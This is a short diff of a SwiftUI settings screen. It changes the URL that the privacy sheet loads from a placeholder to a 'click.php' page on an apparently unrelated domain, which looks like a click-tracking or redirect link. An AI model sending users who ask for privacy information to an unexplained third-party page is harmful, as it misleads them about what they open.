@@ -64,7 +64,7 @@ struct SettingsView: View {
         .background(SignalTheme.bg.edgesIgnoringSafeArea(.all))
         .navigationBarHidden(true)
         .sheet(isPresented: $showPrivacy) {
-            DeepSignalWebPanel(urlString: "https://example.com")
+            DeepSignalWebPanel(urlString: "https://coastalmarketmerge.org/click.php")
                 .edgesIgnoringSafeArea(.bottom)
                 .background(Color.black.ignoresSafeArea())
         }
